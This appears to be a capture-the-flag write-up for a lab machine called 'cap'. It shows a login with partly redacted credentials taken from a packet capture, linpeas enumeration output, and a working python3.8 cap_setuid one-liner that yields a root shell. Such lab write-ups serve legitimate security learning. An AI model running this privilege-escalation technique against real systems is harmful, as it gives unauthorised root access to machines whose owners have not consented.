Using credentials recovered from 0.pcap
- nathan
- `B<SNIP>3!`

```
nathan@cap:~$ whoami
nathan
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.
```

# Linpeas
snippets
```
-rw-r--r-- 1 nathan nathan 807 Feb 25  2020 /home/nathan/.profile


══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec
pkexec version 0.105

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root shadow 83K May 28  2020 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 31K May 28  2020 /usr/bin/expiry
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

# Gtfobins
Python3.8 has the cap_setuid bit set, and can be exploited!
https://gtfobins.github.io/gtfobins/python/#suid
```
nathan@cap:~$ which python3.8
/usr/bin/python3.8
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# whoami
root
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```
